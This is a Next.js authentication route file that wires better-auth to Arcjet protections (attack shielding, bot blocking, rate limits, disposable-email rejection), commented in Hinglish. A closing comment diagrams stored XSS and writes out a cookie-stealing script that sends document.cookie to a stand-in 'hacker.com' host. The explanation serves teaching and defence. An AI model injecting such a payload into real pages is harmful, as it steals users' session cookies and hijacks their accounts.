import { auth } from "@/lib/auth";
import { toNextJsHandler } from "better-auth/next-js";
import arcjet, {
  BotOptions,
  detectBot,
  EmailOptions,
  protectSignup,
  shield,
  slidingWindow,
  SlidingWindowRateLimitOptions,
} from "@arcjet/next";

import { findIp } from "@arcjet/ip";
const aj = arcjet({
  key: process.env.ARCJET_API_KEY!, // 🔑 Arcjet dashboard se apni API key yaha daalo

  // 🎯 Rate limiting kis cheez pe basis hogi
  // - User logged in hai → user ID track hogi
  // - Guest user hai → IP address track hogi
  characteristics: ["userIdOrIp"],

  rules: [
    // 🛡️ Shield: SQL injection, (Cross Site Scripting)XSS aur common attacks se protection
    // LIVE mode = attacks block honge | DRY_RUN = sirf log hoga, block nahi
    shield({ mode: "LIVE" }),
  ],
});

// 🤖 Bot detection settings
const botSettings: BotOptions = {
  mode: "LIVE", // Bots ko actively block karega
  allow: [], // Kaun se bots allow karne hai (empty = koi nahi)
};

// 🐌 Strict rate limit - signup/sensitive operations ke liye
const restrictiveRateLimitSettings = {
  mode: "LIVE",
  max: 10, // Sirf 10 requests allowed
  interval: "10m", // 10 minutes ke window mein
} as SlidingWindowRateLimitOptions<[]>;

// ⚡ Relaxed rate limit - normal API calls ke liye
const relaxRateLimitSettings = {
  mode: "LIVE",
  max: 60, // 60 requests allowed
  interval: "1m", // 1 minute ke window mein
} as SlidingWindowRateLimitOptions<[]>;

// 📧 Email validation settings - fake emails ko rokne ke liye
const emailsSettings = {
  mode: "LIVE", // Invalid emails actively block honge
  block: [
    "DISPOSABLE", // 🗑️ Temporary emails (10minutemail, guerrillamail, etc)
    "INVALID", // ❌ Galat format wale emails (syntax errors)
    "NO_MX_RECORDS", // 🚫 Fake domains jo email receive hi nahi kar sakte
  ],
} as EmailOptions;

const authHandlers = toNextJsHandler(auth);

export const { GET } = authHandlers;

export async function POST(request: Request) {
  const clonedRequest = request.clone();

  // ✅ Arcjet protection - security checks aur rate limiting
  const decision = await checkArcjet(request);

  if (decision.isDenied()) {
    // 🚫 Rate limit exceeded
    if (decision.reason.isRateLimit()) {
      return Response.json(
        { error: "Too many requests. Please try again later." },
        { status: 429 }
      );
    }
    // 📧 Email validation failed
    else if (decision.reason.isEmail()) {
      let message: string;

      if (decision.reason.emailTypes.includes("INVALID")) {
        message = "Email address format is invalid.";
      } else if (decision.reason.emailTypes.includes("DISPOSABLE")) {
        message = "Disposable email addresses are not allowed.";
      } else if (decision.reason.emailTypes.includes("NO_MX_RECORDS")) {
        message = "Email domain is not valid.";
      } else {
        message = "Invalid email address.";
      }

      return Response.json({ error: message }, { status: 400 });
    }
    // 🤖 Bot detected ya Shield ne block kiya
    else if (decision.reason.isBot()) {
      return Response.json(
        { error: "Bot detected. Access denied." },
        { status: 403 }
      );
    }
    // 🛡️ Other security issues (Shield, etc)
    else {
      return Response.json(
        { error: "Access denied due to security policy." },
        { status: 403 }
      );
    }
  }

  return authHandlers.POST(clonedRequest);
}

async function checkArcjet(request: Request) {
  const body = (await request.json()) as unknown;

  const session = await auth.api.getSession({ headers: request.headers });

  const userIdOrIp = (session?.user.id ?? findIp(request)) || "127.0.0.1";

  // 📝 Sign-up endpoint ke liye special protection
  if (request.url.endsWith("/auth/sign-up")) {
    if (
      body &&
      typeof body === "object" &&
      "email" in body &&
      typeof body.email === "string"
    ) {
      // ✅ Full protection: Email validation + Bot detection + Strict rate limiting
      return aj
        .withRule(
          protectSignup({
            email: emailsSettings,
            bots: botSettings,
            rateLimit: restrictiveRateLimitSettings,
          })
        )
        .protect(request, { email: body.email, userIdOrIp });
    } else {
      // ⚠️ Email nahi mila, sirf bot + rate limit check
      return aj
        .withRule(detectBot(botSettings))
        .withRule(slidingWindow(restrictiveRateLimitSettings))
        .protect(request, { userIdOrIp });
    }
  }

  // 🔄 Baaki sab auth endpoints ke liye relaxed protection
  return aj
    .withRule(detectBot(botSettings))
    .withRule(slidingWindow(relaxRateLimitSettings))
    .protect(request, { userIdOrIp });
}
// Pta hai ye wahi File hai jiske help se hum sign and sign-out funtion ko easly implement kr sekte hai

/* How XSS work :-

┌─────────────────────────────────────────────────────────────────────┐
│                        XSS ATTACK FLOW                              │
└─────────────────────────────────────────────────────────────────────┘

┌─────────────┐
│   HACKER    │
└──────┬──────┘
       │
       │ Malicious code inject karta hai
       │ <script>fetch('hacker.com/steal?cookie='+document.cookie)</script>
       ↓
┌──────────────────────┐
│ VULNERABLE WEBSITE   │
│ (No Sanitization ❌) │
└──────┬───────────────┘
       │
       │ Input sanitize nahi karta
       │ Direct accept kar leta hai
       ↓
┌─────────────┐
│  DATABASE   │
└──────┬──────┘
       │
       │ Code as TEXT store hota hai
       │ (Database ko koi farak nahi padta)
       ↓
┌─────────────┐
│   VICTIM    │
└──────┬──────┘
       │
       │ Page visit karta hai
       │ (Comment section, profile, etc.)
       ↓
┌───────────────────────────────────────────────────────────────────┐
│              VICTIM'S BROWSER - INTERNAL PROCESS                  │
├───────────────────────────────────────────────────────────────────┤
│                                                                   │
│  1. Browser receives HTML                                         │
│     ↓                                                             │
│  2. Parses HTML tags                                              │
│     ↓                                                             │
│  3. Encounters <script> tag                                       │
│     ↓                                                             │
│  4. Browser thinks: "Ye website ka legitimate code hai!" 🤔       │
│     ↓                                                             │
│  5. JavaScript Engine execute karta hai                           │
│     ↓                                                             │
│  6. Code runs in victim's browser context                         │
│     Origin: https://vulnerable-site.com                           │
│     Permissions: Full user access ⚠️                              │
│     ↓                                                             │
│  7. Full access mil jata hai:                                     │
│     ✅ document.cookie                                            │
│     ✅ localStorage                                               │
│     ✅ sessionStorage                                             │
│     ✅ User's DOM                                                 │
│     ✅ Browser APIs                                               │
│     ↓                                                             │
│  8. Malicious code execute hota hai                               │
│     fetch('https://hacker.com/steal?cookie=' + document.cookie)   │
│                                                                   │
└────────────────────────┬──────────────────────────────────────────┘
                         │
                         │ [Cookies/Session/Data theft]
                         │
                         ↓
                  ┌──────────────────┐
                  │ HACKER'S SERVER  │
                  └──────┬───────────┘
                         │
                         │ Stolen data receive hota hai:
                         │ - session=abc123
                         │ - userId=456
                         │ - authToken=xyz789
                         │
                         ↓
                  ┌─────────────┐
                  │   HACKER    │
                  └─────────────┘
                         │
                         │ Victim ban jata hai! 🎭
                         │ Stolen cookies use karke login
                         │
                         ↓
                  ┌──────────────────────┐
                  │ ACCOUNT HIJACKED! 💀 │
                  └──────────────────────┘

*/
